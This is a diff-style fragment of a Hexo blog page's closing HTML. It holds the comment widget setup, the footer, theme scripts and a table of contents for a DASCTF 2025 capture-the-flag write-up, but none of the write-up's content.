+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">DASCTF 2025下半年赛 WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SecretPhotoGallery"><span class="nav-text">SecretPhotoGallery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#devweb"><span class="nav-text">devweb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CHECKIN"><span class="nav-text">CHECKIN</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#lost-LFSR-key"><span class="nav-text">lost LFSR key</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezmac"><span class="nav-text">ezmac</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DigitalSignature"><span class="nav-text">DigitalSignature</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
